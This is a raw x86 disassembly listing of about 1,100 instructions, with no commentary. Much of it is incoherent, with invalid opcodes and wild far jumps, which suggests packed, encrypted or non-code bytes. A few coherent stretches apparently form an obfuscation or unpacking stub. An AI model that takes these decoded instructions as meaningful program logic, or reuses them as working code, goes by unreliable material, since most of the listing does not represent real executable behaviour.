  40d92a:	pop    ss
  40d92b:	pop    ebp
  40d92c:	mov    ds:0xccb9cb04,eax
  40d931:	mov    esi,0x931e60d5
  40d936:	and    ecx,DWORD PTR [edi+ebx*1]
  40d939:	mov    eax,ds:0x81aebed7
  40d93e:	adc    dl,BYTE PTR [eax-0x5a]
  40d941:	or     al,0xa8
  40d943:	outs   dx,DWORD PTR ds:[esi]
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x752b51ed
  40d96a:	or     esp,DWORD PTR [ecx]
  40d96c:	fdivr  QWORD PTR [edx]
  40d96e:	nop
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d95b
  40d976:	dec    esi
  40d977:	loop   0x40d903
  40d979:	pop    ss
  40d97a:	lea    edx,[ecx-0x3bdafb0b]
  40d980:	add    eax,0xaa8e68b4
  40d985:	mov    ecx,0x2ee8ec23
  40d98a:	out    0xcd,eax
  40d98c:	ins    BYTE PTR es:[edi],dx
  40d98d:	mov    dl,0xae
  40d98f:	sahf   
  40d990:	mov    esp,DWORD PTR [ecx+edi*2-0xd]
  40d994:	fiadd  DWORD PTR [ebx]
  40d996:	mov    dh,BYTE PTR [eax+edx*8]
  40d999:	jae    0x40d946
  40d99b:	adc    esi,DWORD PTR [eax+ebp*2-0x57]
  40d99f:	xor    DWORD PTR [eax],0x92b0739
  40d9a5:	retf   0xa3ea
  40d9a8:	jge    0x40d9be
  40d9aa:	mov    esp,0xb17c9eb
  40d9af:	mov    edx,0x60c7bcb
  40d9b4:	add    al,0xd
  40d9b6:	icebp  
  40d9b7:	stos   BYTE PTR es:[edi],al
  40d9b8:	jge    0x40d963
  40d9ba:	mov    esi,0x53023354
  40d9bf:	xor    al,0x58
  40d9c1:	mov    ds:0xa19525bd,al
  40d9c6:	nop
  40d9c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9c8:	mov    ebx,0xe6fc7b55
  40d9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ce:	ss push ebp
  40d9d0:	pop    edx
  40d9d1:	fild   WORD PTR [eax+eax*4-0x12cbbb79]
  40d9d8:	ins    BYTE PTR es:[edi],dx
  40d9d9:	add    eax,0x82ecc076
  40d9de:	push   esi
  40d9df:	cmp    eax,0xd444bea0
  40d9e4:	lds    esp,FWORD PTR [ebx+0x7b]
  40d9e7:	cmc    
  40d9e8:	mov    esp,0x2ba38c92
  40d9ed:	jb     0x40d9a6
  40d9ef:	push   cs
  40d9f0:	call   0x5203:0x4b456cc8
  40d9f7:	retf   
  40d9f8:	mov    DWORD PTR [eax],edi
  40d9fa:	inc    eax
  40d9fb:	ins    DWORD PTR es:[edi],dx
  40d9fc:	arpl   WORD PTR ds:0x2f9b1218,di
  40da02:	gs jae 0x40d9da
  40da05:	mov    eax,0x89c54f57
  40da0a:	jns    0x40d9c4
  40da0c:	out    dx,al
  40da0d:	cdq    
  40da0e:	in     al,dx
  40da0f:	mov    bl,0x3
  40da11:	out    dx,eax
  40da12:	sub    DWORD PTR [edi+ecx*1],ebp
  40da15:	fmul   DWORD PTR [edx]
  40da17:	lods   eax,DWORD PTR ds:[esi]
  40da18:	stc    
  40da19:	cmc    
  40da1a:	sub    BYTE PTR [ecx+0x1d],ch
  40da1d:	mov    DWORD PTR [ebp+0x26],ecx
  40da20:	jecxz  0x40d9d7
  40da22:	std    
  40da23:	ret    0x8ddd
  40da26:	addr16 mov ebx,0xbf15dce3
  40da2c:	arpl   WORD PTR [edi],di
  40da2e:	mov    ds:0xd46ffea8,al
  40da33:	call   0x6930:0x6528da15
  40da3a:	jns    0x40d9e3
  40da3c:	pop    esp
  40da3d:	into   
  40da3e:	dec    ebp
  40da3f:	mov    bl,BYTE PTR [eax]
  40da41:	bnd jmp 0x972c80b9
  40da47:	sbb    al,0xb
  40da49:	test   eax,0x2018bab5
  40da4e:	sub    esi,DWORD PTR [eax+0x6b]
  40da51:	rcl    DWORD PTR [edx-0x74334d18],0xee
  40da58:	sbb    edi,DWORD PTR [ebx+esi*8+0x798f40f2]
  40da5f:	xchg   edx,eax
  40da60:	imul   esp,ebx,0x43789c69
  40da66:	pop    ebx
  40da67:	jno    0x40da2c
  40da69:	aas    
  40da6a:	retf   
  40da6b:	push   ss
  40da6c:	push   es
  40da6d:	sbb    BYTE PTR [eax+0x76],al
  40da70:	push   edi
  40da71:	and    eax,0x24fdc603
  40da76:	rol    bh,0x15
  40da79:	jae    0x40da3d
  40da7b:	mov    ebp,ecx
  40da7d:	push   eax
  40da7e:	jb     0x40daed
  40da80:	out    0x50,al
  40da82:	pop    ebp
  40da83:	jmp    0x40da84
  40da85:	mov    ebx,0xf7144cd2
  40da8a:	adc    eax,0x2f312a6e
  40da8f:	xchg   DWORD PTR [edi+esi*2],edi
  40da92:	pop    ebp
  40da93:	clc    
  40da94:	push   ecx
  40da95:	leave  
  40da96:	inc    eax
  40da97:	enter  0x8e48,0x88
  40da9b:	adc    eax,DWORD PTR [ecx+0x5c00a7f1]
  40daa1:	push   es
  40daa2:	jno    0x40dac6
  40daa4:	into   
  40daa5:	and    BYTE PTR [ebx-0x476282a0],dl
  40daab:	int    0x5c
  40daad:	xor    ecx,DWORD PTR [ecx+0x2b]
  40dab0:	add    ebp,ebp
  40dab2:	mov    ah,0xef
  40dab4:	jae    0x40da73
  40dab6:	(bad)  
  40dab7:	test   ax,0x10ca
  40dabb:	or     eax,0xef428ad1
  40dac0:	fisub  WORD PTR [edi-0x5b3d7900]
  40dac6:	out    dx,al
  40dac7:	mov    ds:0x97427d6a,eax
  40dacc:	and    DWORD PTR [ecx-0x4d],ebp
  40dacf:	mov    ds:0x7e538b94,al
  40dad4:	pop    ebp
  40dad5:	push   ss
  40dad6:	cmp    eax,0x3d7f5c65
  40dadb:	(bad)  
  40dadd:	ss popa 
  40dadf:	add    DWORD PTR [esi+0x78cdcf9e],ebp
  40dae5:	not    eax
  40dae7:	(bad)  
  40dae8:	pop    ebx
  40dae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daea:	lea    edi,fs:[esi-0x7f]
  40daee:	xor    ebx,ebp
  40daf0:	cmp    esp,DWORD PTR [esi-0x4b]
  40daf3:	mov    ebp,0x45bb0788
  40daf8:	mov    cs,WORD PTR gs:[eax-0x3b]
  40dafc:	lods   al,BYTE PTR ds:[esi]
  40dafd:	jne    0x40dafc
  40daff:	dec    esp
  40db00:	icebp  
  40db01:	pushf  
  40db02:	out    dx,eax
  40db03:	nop
  40db04:	jmp    0x40daf6
  40db06:	push   ebx
  40db07:	pop    es
  40db08:	cmp    BYTE PTR [esi],cl
  40db0a:	aam    0x9f
  40db0c:	lds    edx,FWORD PTR [ebp+0x0]
  40db0f:	aas    
  40db10:	(bad)  
  40db11:	mov    ch,0x83
  40db13:	jg     0x40db27
  40db15:	aam    0xf9
  40db17:	sbb    dl,bl
  40db19:	inc    ebx
  40db1a:	sbb    esi,DWORD PTR [ebx]
  40db1c:	mov    dl,0xc
  40db1e:	push   cs
  40db1f:	xor    ah,BYTE PTR [edx]
  40db21:	fisttp QWORD PTR [esi+ebp*1]
  40db24:	adc    al,0xc8
  40db26:	retf   
  40db27:	adc    DWORD PTR es:[eax-0x7b],esi
  40db2b:	mov    ebx,esi
  40db2d:	fs push ds
  40db2f:	xor    al,0x3
  40db31:	mov    ch,0xee
  40db33:	js     0x40daf1
  40db35:	scas   al,BYTE PTR es:[edi]
  40db36:	jno    0x40dbb1
  40db38:	repnz mov edi,0xfd9b0585
  40db3e:	jae    0x40dae2
  40db40:	push   cs
  40db41:	es cli 
  40db43:	ins    BYTE PTR es:[edi],dx
  40db44:	xlat   BYTE PTR ds:[ebx]
  40db45:	loop   0x40db1b
  40db47:	mov    bl,0xb6
  40db49:	mov    ch,0xd4
  40db4b:	cmp    DWORD PTR [edx-0x1dbefd8a],eax
  40db51:	jae    0x40dbba
  40db53:	loop   0x40dbc5
  40db55:	mov    WORD PTR [esi-0xd],?
  40db58:	loop   0x40db1f
  40db5a:	xchg   esp,eax
  40db5b:	mov    esi,0x3443ddb8
  40db60:	fst    DWORD PTR [esp+ebx*1-0x19]
  40db64:	and    eax,0x6c5fc11e
  40db69:	push   0xb722e8a0
  40db6e:	adc    BYTE PTR [ebx+0x3f],bl
  40db71:	jmp    0x40db0b
  40db73:	sub    DWORD PTR [ecx+0x3164e402],edi
  40db79:	xchg   esi,eax
  40db7a:	dec    ecx
  40db7b:	adc    al,0xc6
  40db7d:	and    DWORD PTR [eax],ecx
  40db7f:	and    eax,0xeb1be8bb
  40db84:	pop    es
  40db85:	int3   
  40db86:	es ins BYTE PTR es:[edi],dx
  40db88:	(bad)  
  40db89:	fmul   QWORD PTR [eax+0x72]
  40db8c:	ror    ecx,1
  40db8e:	jp     0x40db5a
  40db90:	dec    esp
  40db91:	aas    
  40db92:	daa    
  40db93:	fidivr WORD PTR [ebx-0x23]
  40db96:	add    BYTE PTR ds:0x4999f0e5,ch
  40db9c:	stos   DWORD PTR es:[edi],eax
  40db9d:	mov    esp,0xade26bdf
  40dba2:	(bad)  
  40dba4:	or     bh,dl
  40dba6:	adc    BYTE PTR [ebp-0x45],bh
  40dba9:	inc    eax
  40dbaa:	ins    DWORD PTR es:[edi],dx
  40dbab:	enter  0x8ccb,0x8b
  40dbaf:	lods   al,BYTE PTR ds:[esi]
  40dbb0:	lea    edi,[eax+eiz*1-0x3ec46555]
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x2840145c],0xfa97e2ff
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc2a
  40dbe0:	inc    edi
  40dbe1:	dec    eax
  40dbe2:	test   al,0xf6
  40dbe4:	pushf  
  40dbe5:	lods   eax,DWORD PTR ds:[esi]
  40dbe6:	pop    es
  40dbe7:	dec    esi
  40dbe8:	ins    BYTE PTR es:[edi],dx
  40dbe9:	or     eax,0x700a89a4
  40dbee:	mov    al,ds:0xf9b543ba
  40dbf3:	aam    0x12
  40dbf5:	cmp    al,0xfc
  40dbf7:	or     eax,0xd5709db7
  40dbfc:	popf   
  40dbfd:	jae    0x40db94
  40dbff:	and    al,0x17
  40dc01:	sub    DWORD PTR [ebp-0x2],0x6f
  40dc05:	call   0x7ec9:0xbf90b5a6
  40dc0c:	jecxz  0x40dc8c
  40dc0e:	leave  
  40dc0f:	pop    ebx
  40dc10:	sbb    al,0x22
  40dc12:	fiadd  DWORD PTR [ebx]
  40dc14:	push   ebx
  40dc15:	xor    eax,0xc6ba3bde
  40dc1a:	add    eax,0x69bedcea
  40dc1f:	inc    edx
  40dc20:	lock dec esi
  40dc22:	push   ss
  40dc23:	int    0x89
  40dc25:	test   eax,0x80849b9d
  40dc2a:	mov    edi,0x38290afd
  40dc2f:	retf   0x2c1a
  40dc32:	or     ecx,DWORD PTR [eax-0x2e579bf]
  40dc38:	sub    al,BYTE PTR [edx]
  40dc3a:	add    BYTE PTR [esi+ecx*2],0xb8
  40dc3e:	enter  0xc20c,0x31
  40dc42:	jmp    0x40dca5
  40dc44:	ja     0x40dc5a
  40dc46:	xor    eax,edx
  40dc48:	adc    cl,BYTE PTR [eax+0x2f]
  40dc4b:	data16 (bad) 
  40dc4d:	hlt    
  40dc4e:	fnsave [eax-0x5]
  40dc51:	sahf   
  40dc52:	pushf  
  40dc53:	jno    0x40dc68
  40dc55:	call   0x94ec3631
  40dc5a:	jmp    FWORD PTR [edi-0x36404c36]
  40dc60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc61:	lahf   
  40dc62:	jo     0x40dbf7
  40dc64:	xchg   esp,eax
  40dc65:	repnz pop esp
  40dc67:	sub    eax,0x62e320a6
  40dc6c:	clc    
  40dc6d:	xor    DWORD PTR [ecx],ebp
  40dc6f:	and    esi,DWORD PTR cs:[edi-0x45fb0c9c]
  40dc76:	lods   eax,DWORD PTR ds:[esi]
  40dc77:	pusha  
  40dc78:	lahf   
  40dc79:	jp     0x40dc70
  40dc7b:	enter  0xf10e,0xc1
  40dc7f:	enter  0xdef7,0x42
  40dc83:	outs   dx,BYTE PTR ds:[esi]
  40dc84:	int3   
  40dc85:	xor    BYTE PTR [ecx],al
  40dc87:	cli    
  40dc88:	mov    cl,0x93
  40dc8a:	shl    edx,1
  40dc8c:	(bad)  
  40dc8e:	into   
  40dc8f:	or     DWORD PTR [ecx+0x16],eax
  40dc92:	lods   al,BYTE PTR ds:[esi]
  40dc93:	fst    DWORD PTR [ecx]
  40dc95:	or     al,0xd6
  40dc97:	push   ebp
  40dc98:	fcomi  st,st(3)
  40dc9a:	in     eax,0x48
  40dc9c:	mov    dl,0xa4
  40dc9e:	fbld   TBYTE PTR [ebp+0x4c0e2de1]
  40dca4:	fsubr  QWORD PTR [eax]
  40dca6:	cwde   
  40dca7:	xor    DWORD PTR [esi],edx
  40dca9:	in     eax,0xf5
  40dcab:	out    0x53,eax
  40dcad:	int3   
  40dcae:	iret   
  40dcaf:	dec    eax
  40dcb0:	pop    ds
  40dcb1:	mov    cl,0x3c
  40dcb3:	test   eax,0x22ede853
  40dcb8:	enter  0xaae8,0xe5
  40dcbc:	mov    edx,0x6c682b62
  40dcc1:	inc    ebx
  40dcc2:	cs sbb ch,dl
  40dcc5:	inc    esp
  40dcc6:	test   eax,0x712ebd2b
  40dccb:	and    DWORD PTR [edx-0x70],edi
  40dcce:	jmp    0x40dc76
  40dcd0:	add    BYTE PTR [ebx-0x78ef1c88],ch
  40dcd6:	test   BYTE PTR [eax+0x3afe80cf],ch
  40dcdc:	int3   
  40dcdd:	and    DWORD PTR [eax-0x69],esi
  40dce0:	mov    dl,0xa2
  40dce2:	inc    eax
  40dce3:	lahf   
  40dce4:	pop    ebp
  40dce5:	ja     0x40dc82
  40dce7:	jo     0x40dd5c
  40dce9:	lock pop edi
  40dceb:	dec    ebx
  40dcec:	mov    cl,0x39
  40dcee:	cmp    eax,0x99b99b98
  40dcf3:	pop    esp
  40dcf4:	js     0x40dca6
  40dcf6:	inc    ebx
  40dcf7:	mov    cs,WORD PTR [edx-0x1e]
  40dcfa:	into   
  40dcfb:	scas   al,BYTE PTR es:[edi]
  40dcfc:	repz hlt 
  40dcfe:	xor    al,0x5f
  40dd00:	pop    es
  40dd01:	pop    ebx
  40dd02:	jb     0x40dd29
  40dd04:	into   
  40dd05:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40dd07:	sbb    al,0x2d
  40dd09:	rcr    BYTE PTR [eax-0x64],cl
  40dd0c:	fimul  DWORD PTR [edx]
  40dd0e:	dec    edx
  40dd0f:	ins    BYTE PTR es:[edi],dx
  40dd10:	inc    ecx
  40dd11:	mov    ds:0x7f454641,eax
  40dd16:	cld    
  40dd17:	stos   DWORD PTR es:[edi],eax
  40dd18:	fild   WORD PTR [edi]
  40dd1a:	push   DWORD PTR [ecx-0x1b4abcb8]
  40dd20:	aad    0xdd
  40dd22:	in     eax,dx
  40dd23:	arpl   WORD PTR [ebp-0x648557ae],di
  40dd29:	repnz and BYTE PTR [edx+0x1a],dh
  40dd2d:	(bad)
  40dd31:	lahf   
  40dd32:	mov    eax,ds:0x8b20b89f
  40dd37:	inc    edi
  40dd38:	pop    ebp
  40dd39:	lods   eax,DWORD PTR ds:[esi]
  40dd3a:	lds    eax,FWORD PTR [eax-0x22ee948d]
  40dd40:	sub    eax,0x2b2ca05c
  40dd45:	repnz mov ebx,esi
  40dd48:	in     eax,0xc8
  40dd4a:	inc    eax
  40dd4b:	adc    bh,cl
  40dd4d:	in     eax,dx
  40dd4e:	mov    edi,edx
  40dd50:	mov    al,ds:0x9a97946f
  40dd55:	jl     0x40ddc9
  40dd57:	popf   
  40dd58:	push   ds
  40dd59:	mov    esp,0xe25cda1c
  40dd5e:	lods   al,BYTE PTR ds:[esi]
  40dd5f:	push   esp
  40dd60:	fs or  ecx,0xe9806728
  40dd67:	cmc    
  40dd68:	or     edi,DWORD PTR ds:0x92c15207
  40dd6e:	lods   eax,DWORD PTR ds:[esi]
  40dd6f:	sbb    eax,0xa263b670
  40dd74:	push   ecx
  40dd75:	or     cl,BYTE PTR [ebp+0x6c]
  40dd78:	push   0xf875e1a8
  40dd7d:	add    eax,0x1ebf2b73
  40dd82:	dec    ebp
  40dd83:	jp     0x40dd12
  40dd85:	scas   eax,DWORD PTR es:[edi]
  40dd86:	lods   eax,DWORD PTR ds:[esi]
  40dd87:	xor    eax,0x5cbb751b
  40dd8c:	sub    al,0x44
  40dd8e:	push   ss
  40dd8f:	repz jg 0x40dd8c
  40dd92:	mov    cs,WORD PTR [esp+ebx*1-0x43]
  40dd96:	add    eax,0xee6266c4
  40dd9b:	dec    edi
  40dd9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd9d:	cmp    DWORD PTR [ebp-0x5d9a5eea],0x4e
  40dda4:	loope  0x40ddff
  40dda6:	rep lods al,BYTE PTR ds:[esi]
  40dda8:	daa    
  40dda9:	sub    al,0x6f
  40ddab:	jns    0x40dda6
  40ddad:	adc    dl,BYTE PTR [esi-0x15260cfd]
  40ddb3:	jno    0x40dd94
  40ddb5:	out    0xde,eax
  40ddb7:	popf   
  40ddb8:	mov    eax,ds:0x92626026
  40ddbd:	jmp    0x60b3163a
  40ddc2:	jge    0x40dddb
  40ddc4:	cmp    DWORD PTR [ebx],esi
  40ddc6:	je     0x40de42
  40ddc8:	shl    BYTE PTR [esi-0x5c40b459],0x59
  40ddcf:	(bad)  
  40ddd0:	xor    ebp,DWORD PTR [esi+ebx*2+0x1]
  40ddd4:	daa    
  40ddd5:	or     DWORD PTR [ebx],0xfffffffe
  40ddd8:	jp     0x40ddfb
  40ddda:	cs out 0x8c,al
  40dddd:	fidiv  WORD PTR [eax]
  40dddf:	outs   dx,DWORD PTR ds:[esi]
  40dde0:	scas   eax,DWORD PTR es:[edi]
  40dde1:	sub    BYTE PTR [eax-0x28ba50f8],dh
  40dde7:	test   BYTE PTR [ebp+0x493dcdb6],dh
  40dded:	mov    esp,0x3a366990
  40ddf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddf3:	lods   eax,DWORD PTR ds:[esi]
  40ddf4:	adc    esp,eax
  40ddf6:	xchg   DWORD PTR [ebx+0x37],ecx
  40ddf9:	push   esp
  40ddfa:	add    cl,dh
  40ddfc:	test   DWORD PTR [esi],ebp
  40ddfe:	mov    DWORD PTR [esi+0x1357671b],ebx
  40de04:	out    0xdc,al
  40de06:	dec    edi
  40de07:	ror    BYTE PTR [ebx+0x5a254ed3],0xab
  40de0e:	mov    BYTE PTR [esp+ebp*2-0x629a6dbb],bl
  40de15:	sbb    eax,0xa76b1d1c
  40de1a:	cmp    eax,0x2eb1753a
  40de1f:	add    eax,esi
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	imul   esp
  40dea7:	cmp    al,BYTE PTR [ebx+esi*8+0x7e7e9cba]
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40de90
  40deb3:	inc    ebx
  40deb4:	adc    BYTE PTR [ebp-0x1f1a7d33],dh
  40deba:	rol    DWORD PTR [edi-0x2],0x5f
  40debe:	es inc edx
  40dec0:	xor    edx,edx
  40dec2:	(bad)
  40dec6:	or     BYTE PTR [eax],0xe7
  40dec9:	xlat   BYTE PTR ds:[ebx]
  40deca:	mov    BYTE PTR [esi+eax*1-0x24],ch
  40dece:	sub    cl,dl
  40ded0:	ja     0x40de76
  40ded2:	fimul  WORD PTR [esi]
  40ded4:	inc    eax
  40ded5:	(bad)  
  40ded6:	jge    0x40de96
  40ded8:	jb     0x40dea5
  40deda:	pop    ds
  40dedb:	adc    BYTE PTR [edx+0x4f6d0cc8],cl
  40dee1:	jnp    0x40df13
  40dee3:	int3   
  40dee4:	xor    DWORD PTR [esi],ebp
  40dee6:	push   edi
  40dee7:	int    0x7c
  40dee9:	shl    dh,0xa9
  40deec:	and    al,0x8e
  40deee:	lods   al,BYTE PTR ds:[esi]
  40deef:	scas   al,BYTE PTR es:[edi]
  40def0:	xchg   DWORD PTR [eax],ebp
  40def2:	(bad)  
  40def3:	clc    
  40def4:	cwde   
  40def5:	jge    0x40decb
  40def7:	adc    bl,BYTE PTR [esi+0x61]
  40defa:	scas   al,BYTE PTR es:[edi]
  40defb:	outs   dx,BYTE PTR ds:[esi]
  40defc:	addr16 or dh,bh
  40deff:	fisub  WORD PTR [ebx+eax*2-0x6020ffd]
  40df06:	das    
  40df07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df08:	pop    ss
  40df09:	out    0x52,al
  40df0b:	cmc    
  40df0c:	mov    BYTE PTR [eax-0x3b],0xec
  40df10:	xchg   edx,esp
  40df12:	push   0xffffff94
  40df14:	aad    0x95
  40df16:	mov    ds,WORD PTR [ecx-0x25e35c0]
  40df1c:	cwde   
  40df1d:	lods   al,BYTE PTR ds:[esi]
  40df1e:	mov    ebp,0x8f622e1e
  40df23:	inc    esi
  40df24:	and    ecx,DWORD PTR [eax]
  40df26:	mov    esp,0x4ebeaade
  40df2b:	test   DWORD PTR [ebx-0x70],esp
  40df2e:	xor    ebx,ebp
  40df30:	shl    edi,0x55
  40df33:	inc    ebp
  40df34:	pop    edi
  40df35:	aas    
  40df36:	sbb    BYTE PTR [edx],ah
  40df38:	add    BYTE PTR [edx],dl
  40df3a:	std    
  40df3b:	xchg   esp,eax
  40df3d:	daa    
  40df3e:	push   ebx
  40df3f:	ds push ss
  40df41:	lds    esp,FWORD PTR [ebp-0x71330150]
  40df47:	xlat   BYTE PTR ds:[ebx]
  40df48:	lods   eax,DWORD PTR ds:[esi]
  40df49:	call   0x81bd:0x3fc60875
  40df50:	push   ebp
  40df51:	sub    BYTE PTR [ebx+edx*2],dh
  40df54:	push   es
  40df55:	in     eax,0x30
  40df57:	lds    ecx,FWORD PTR [edx]
  40df59:	xlat   BYTE PTR ds:[ebx]
  40df5a:	push   ebp
  40df5b:	mov    ebx,0x3c4a4bf
  40df60:	push   ds
  40df61:	inc    esi
  40df62:	jle    0x40def6
  40df64:	xor    edi,DWORD PTR [edx-0x2482b789]
  40df6a:	sbb    ebx,DWORD PTR [ecx+0x369f93f4]
  40df70:	lea    esi,[edi+0x3b]
  40df73:	test   BYTE PTR [esi+0x11],dl
  40df76:	in     eax,dx
  40df77:	and    BYTE PTR [eax+ebx*4-0x50],bh
  40df7b:	inc    ebp
  40df7c:	jmp    0x40dfec
  40df7e:	je     0x40df03
  40df80:	inc    esi
  40df81:	mov    ds,esi
  40df83:	sbb    DWORD PTR ds:0x5f7bd8e2,0xf27f5429
  40df8d:	push   ss
  40df8e:	and    bh,BYTE PTR [ebp*8+0x133bdefb]
  40df95:	cwde   
  40df96:	imul   esi,eax,0x3b5a0fbd
  40df9c:	mov    bh,0x31
  40df9e:	lods   al,BYTE PTR ds:[esi]
  40df9f:	sub    al,0xb1
  40dfa1:	in     eax,0x7c
  40dfa3:	mov    al,BYTE PTR [eax]
  40dfa5:	push   edx
  40dfa6:	out    dx,eax
  40dfa7:	xchg   esp,eax
  40dfa8:	mul    BYTE PTR [ebx]
  40dfaa:	sti    
  40dfab:	mov    edi,0xe2109480
  40dfb0:	int    0x78
  40dfb2:	repnz cld 
  40dfb4:	jmp    0x40df5b
  40dfb6:	or     bh,BYTE PTR [ecx-0x58355509]
  40dfbc:	mov    ah,0x83
  40dfbe:	sti    
  40dfbf:	and    ecx,DWORD PTR ds:0x6a564e5a
  40dfc5:	jno    0x40dfdb
  40dfc7:	outs   dx,BYTE PTR ds:[esi]
  40dfc8:	call   0xd4d12687
  40dfcd:	jns    0x40df5a
  40dfcf:	inc    ebp
  40dfd0:	or     BYTE PTR [ecx+0x4336972d],al
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	aas    
  40e004:	ins    DWORD PTR es:[edi],dx
  40e005:	cmp    DWORD PTR [esi+ebx*2+0x127e7e9d],esp
  40e00c:	jg     0x40e08c
  40e00e:	jle    0x40dfbf
  40e010:	fs mov ah,0xa1
  40e013:	loope  0x40e047
  40e015:	(bad)  
  40e017:	cmp    dl,dh
  40e019:	cmp    BYTE PTR [ebx-0x59],ch
  40e01c:	add    al,0xdc
  40e01e:	popa   
  40e01f:	mov    al,dl
  40e021:	(bad)  
  40e022:	jne    0x40e036
  40e024:	mov    ebx,0x7d1bbef5
  40e029:	sub    al,0x9c
  40e02b:	xchg   DWORD PTR [ebp-0x1],esp
  40e02e:	sbb    eax,DWORD PTR [ecx-0x19]
  40e031:	pop    eax
  40e032:	shr    BYTE PTR [ecx+0x3d3fe0ff],cl
  40e038:	xor    eax,0x5af905b2
  40e03d:	in     eax,dx
  40e03e:	adc    eax,DWORD PTR [ebx]
  40e040:	push   0xfffffff3
  40e042:	cmp    BYTE PTR [edx+0x61],0x8f
  40e046:	jmp    DWORD PTR [eax]
  40e048:	outs   dx,DWORD PTR ds:[esi]
  40e049:	popa   
  40e04a:	inc    esp
  40e04b:	test   BYTE PTR [ebx+0x3],dl
  40e04e:	out    0x2d,eax
  40e050:	pop    edi
  40e051:	xor    esp,edx
  40e053:	dec    edi
  40e054:	dec    edx
  40e055:	add    DWORD PTR [esi-0x17],esi
  40e058:	jmp    FWORD PTR ds:0x2d724656
  40e05e:	mov    ch,0x39
  40e060:	mov    esi,0xa8345698
  40e065:	outs   dx,BYTE PTR ds:[esi]
  40e066:	sbb    edx,DWORD PTR [edi+0x42]
  40e069:	repz sub ebx,DWORD PTR [edx+esi*8+0x7b]
  40e06e:	mov    cl,0x8f
  40e070:	lods   eax,DWORD PTR ds:[esi]
  40e071:	add    bh,BYTE PTR [eax-0x6e11046b]
  40e077:	jp     0x40e0d5
  40e079:	aaa    
  40e07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e07b:	(bad)  
  40e07c:	jmp    0x9a0e:0xc65b4d59
  40e083:	ret    
  40e084:	outs   dx,DWORD PTR ds:[esi]
  40e085:	bound  edx,QWORD PTR [ebx+0x57]
  40e088:	xchg   ecx,eax
  40e089:	lahf   
  40e08a:	dec    edi
  40e08b:	jno    0x40e053
  40e08d:	rcl    DWORD PTR [esi-0x5b4ad84d],cl
  40e093:	push   esp
  40e094:	shr    BYTE PTR [ebx-0x13],cl
  40e097:	test   al,0xad
  40e099:	push   ebx
  40e09a:	in     eax,dx
  40e09b:	fmul   QWORD PTR [ecx-0x14]
  40e09e:	test   edi,edi
  40e0a0:	scas   eax,DWORD PTR es:[edi]
  40e0a1:	xchg   BYTE PTR [ebx-0x3f112469],ch
  40e0a7:	jne    0x40e112
  40e0a9:	sub    al,0xda
  40e0ab:	xor    ebx,DWORD PTR [esi+eiz*4-0x4f]
  40e0af:	push   es
  40e0b0:	or     BYTE PTR ds:0xe8bd73a4,bl
  40e0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0b7:	mov    WORD PTR [edx-0x5e],gs
  40e0ba:	mov    ?,WORD PTR [ebx+0x1f]
  40e0bd:	mov    ebx,0x8745a89d
  40e0c2:	outs   dx,DWORD PTR ds:[esi]
  40e0c3:	cmp    al,0x21
  40e0c5:	adc    esp,edi
  40e0c7:	addr16 pop ss
  40e0c9:	push   edx
